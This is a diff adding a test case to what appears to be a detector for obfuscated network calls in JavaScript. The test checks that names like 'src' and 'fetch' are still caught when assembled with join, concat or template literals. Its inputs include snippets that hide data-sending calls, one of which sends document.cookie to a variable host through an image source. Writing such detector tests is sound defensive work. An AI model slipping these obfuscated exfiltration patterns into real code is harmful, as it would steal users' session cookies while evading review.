@@ -154,3 +154,12 @@ test('everyday code that only looks like hiding a name', () => {
   has('const k = "hctef".split("").reverse().join(""); w[k]("/x")', 'hidden');
   has('const a = { onload: "fetch(1)" }; for (const k in a) e.setAttribute(k, a[k])', 'hidden');
 });
+
+test('names spelled from literal pieces in other ways count too (join, concat, a template of literals)', () => {
+  has('const k = ["s", "r", "c"].join(""); img[k] = "https://" + host + "/?d=" + data', 'loads');
+  has('const k = "sr".concat("c"); img[k] = u', 'loads');
+  has('const k = `${"s"}rc`; img[k] = u', 'loads');
+  has('const f = ["fe", "tch"].join(""); self[f]("/x")', 'sends');
+  has('const set = (o, k, v) => { o[k] = v; }; set(new Image(), "src", "https://" + host + "/?d=" + document.cookie)', 'loads');
+  none('const cls = ["a", "b"].join(" "); el.className = cls');
+});
